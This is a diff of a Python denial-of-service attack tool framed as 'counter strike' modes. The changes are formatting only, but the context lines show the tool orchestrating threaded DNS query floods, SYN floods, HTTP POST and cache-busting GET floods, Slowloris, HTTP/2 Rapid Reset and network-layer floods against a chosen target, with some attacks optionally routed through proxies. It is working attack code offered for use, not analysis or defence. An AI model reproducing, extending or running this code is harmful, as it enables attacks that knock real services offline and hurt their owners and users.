@@ -48,10 +48,12 @@ def reconnaissance_led_strike(target, use_proxy, network_interface):
 
     params = {"threads": 100, "h2_threads": 25, "duration": 120}
     print(
-        f"[CONFIG] Using {params['threads']} flood threads and {params['h2_threads']} H2 connections for {params['duration']}s.")
+        f"[CONFIG] Using {params['threads']} flood threads and {params['h2_threads']}"
+        f" H2 connections for {params['duration']}s.")
 
     # --- Dynamically launch attacks ONLY on open ports ---
-    if use_proxy: print("[PROXY] L7 attacks will be routed through the proxy.")
+    if use_proxy:
+        print("[PROXY] L7 attacks will be routed through the proxy.")
 
     # Always launch DNS Query Flood as it's a primary vector
     args = (target, params["duration"], stop_event, pause_event, params["threads"], network_interface)
@@ -100,7 +102,8 @@ def full_scale_counter_strike(target, use_proxy, network_interface):
         "duration": 360,
     }
     print(
-        f"[CONFIG] Siege mode: Using {params['threads']} flood threads, {params['slowloris_sockets']} Slowloris sockets, and {params['h2_threads']} H2 connections.")
+        f"[CONFIG] Siege mode: Using {params['threads']} flood threads, {params['slowloris_sockets']} "
+        f"Slowloris sockets, and {params['h2_threads']} H2 connections.")
 
     # --- Launch Network Layer Floods (L3/L4) ---
     print("[+] Preparing L3/L4 vectors (UDP, SYN, ICMP, TCP Frag)...")
@@ -125,7 +128,8 @@ def full_scale_counter_strike(target, use_proxy, network_interface):
     print("[+] Preparing L7 vectors (DNS Query, POST Flood, Slowloris, H2 Reset)...")
     args = (target, params["duration"], stop_event, pause_event, params["threads"], network_interface)  # DNS Query
     attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_query_flood, args))
-    if use_proxy: print("[PROXY] HTTP POST and Slowloris attacks will be routed through the proxy.")
+    if use_proxy:
+        print("[PROXY] HTTP POST and Slowloris attacks will be routed through the proxy.")
 
     # NEW: HTTP Cache-Busting GET Flood (Proxy-aware)
     for port in [80, 443]:
@@ -145,7 +149,8 @@ def full_scale_counter_strike(target, use_proxy, network_interface):
 
     print(f"[+] Full-scale attack launched. Press Ctrl+C to stop.")
     try:
-        while any(t.is_alive() for t in attack_threads): time.sleep(1)
+        while any(t.is_alive() for t in attack_threads):
+            time.sleep(1)
     except KeyboardInterrupt:
         print("\n[!] Keyboard interrupt received. Signaling all threads to stop...")
         stop_event.set()
@@ -172,13 +177,13 @@ def fast_scale_counter_strike(target, use_proxy, network_interface):
     attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_query_flood, args))
     for port in [80, 443, 22]:  # SYN
         attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, (
-        target, port, params["duration"], stop_event, pause_event, params["threads"], network_interface)))
+            target, port, params["duration"], stop_event, pause_event, params["threads"], network_interface)))
     for port in [80, 443]:  # HTTP POST
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_post, (
-        target, port, params["duration"], stop_event, pause_event, params["threads"], use_proxy)))
+            target, port, params["duration"], stop_event, pause_event, params["threads"], use_proxy)))
     # NEW: HTTP/2 Rapid Reset
     attack_threads.append(launch_attack_thread(counter_strike_helper.attack_h2_rapid_reset, (
-    target, 443, params["duration"], stop_event, pause_event, params["h2_threads"])))
+        target, 443, params["duration"], stop_event, pause_event, params["h2_threads"])))
 
     print(f"[+] Fast-scale attack launched. Running for {params['duration']}s. Press Ctrl+C to stop.")
     try:
@@ -200,17 +205,20 @@ def adaptive_strike(target, use_proxy, network_interface):
         threads = int(input("Enter number of threads for classic floods (e.g., 150): "))
         h2_threads = int(input("Enter number of H2 connections (e.g., 40): "))
         target_ip = socket.gethostbyname(target)
-    except (ValueError, socket.gaierror) as e:
-        print(f"[!] Invalid input or could not resolve host: {e}. Aborting.")
+    except (ValueError, socket.gaierror) as err:
+        print(f"[!] Invalid input or could not resolve host: {err}. Aborting.")
         return
 
     stop_event, pause_event = threading.Event(), threading.Event()
 
     # Define the attack profile, now including H2 Rapid Reset
     attack_profile = [
-        (counter_strike_helper.attack_dns_query_flood, (target, total_duration, stop_event, pause_event, threads, network_interface)),
-        (counter_strike_helper.synflood, (target, 80, total_duration, stop_event, pause_event, threads, network_interface)),
-        (counter_strike_helper.attack_http_post, (target, 80, total_duration, stop_event, pause_event, threads, use_proxy)),
+        (counter_strike_helper.attack_dns_query_flood,
+         (target, total_duration, stop_event, pause_event, threads, network_interface)),
+        (counter_strike_helper.synflood,
+         (target, 80, total_duration, stop_event, pause_event, threads, network_interface)),
+        (counter_strike_helper.attack_http_post,
+         (target, 80, total_duration, stop_event, pause_event, threads, use_proxy)),
         # NEW: HTTP/2 Rapid Reset
         (counter_strike_helper.attack_h2_rapid_reset,
          (target, 443, total_duration, stop_event, pause_event, h2_threads)),
